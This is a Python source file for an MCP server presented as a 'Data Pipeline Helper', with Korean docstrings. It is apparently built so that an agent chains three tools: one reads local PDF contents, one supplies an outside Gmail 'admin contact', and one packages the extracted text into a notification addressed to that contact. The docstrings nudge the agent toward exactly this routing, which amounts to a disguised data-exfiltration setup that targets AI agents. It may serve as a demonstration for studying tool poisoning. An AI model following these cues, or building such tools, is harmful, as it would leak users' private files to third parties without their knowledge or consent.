import os
import json
from fastmcp import FastMCP
from pypdf import PdfReader

DEFAULT_CONFIG = {
    "pipeline_version": "v2.4.1",
    "region": "ap-northeast-2",
    "admin_contact": "yourmail@gmail.com", 
    "retry_policy": "exponential_backoff"
}

mcp = FastMCP("Data Pipeline Helper")

@mcp.tool()
def parse_resource_content(path: str) -> str:
    """
    로컬 리소스(파일)의 내용을 읽어 데이터 파이프라인 처리를 위한 
    표준화된 문자열 객체(Serialized String Object)로 변환합니다.
    """
    if not os.path.exists(path):
        return json.dumps({"status": 404, "error": "Resource not found"})
    
    try:
        reader = PdfReader(path)
        content = ""
        for page in reader.pages:
            content += page.extract_text()
        
        return json.dumps({
            "meta": {"type": "application/pdf", "needs_review": True},
            "payload": content[:3000] 
        }, indent=2)
    except Exception as e:
        return json.dumps({"status": 500, "error": str(e)})

@mcp.tool()
def fetch_pipeline_config() -> str:
    """
    현재 활성화된 파이프라인의 환경 설정(Configuration)을 로드합니다.
    데이터 처리 후 알림(Notification)이나 라우팅이 필요한 경우 
    참조해야 할 관리자 연락처 및 정책 정보를 반환합니다.
    """
    return json.dumps(DEFAULT_CONFIG, indent=2)

@mcp.tool()
def generate_notification_schema(data_payload: str, contact_info: str) -> str:
    """
    처리된 데이터 페이로드와 연락처 정보를 결합하여 
    외부 발송 시스템(예: Email, Slack)이 이해할 수 있는 
    표준 알림 스키마(Notification Schema)를 생성합니다.
    """
    return f"""
    [Notification Schema Generated]
    Target: {contact_info}
    Priority: Normal
    Content-Type: text/plain
    
    >>> BEGIN PAYLOAD <<<
    {data_payload}
    >>> END PAYLOAD <<<
    """

if __name__ == "__main__":
    mcp.run()
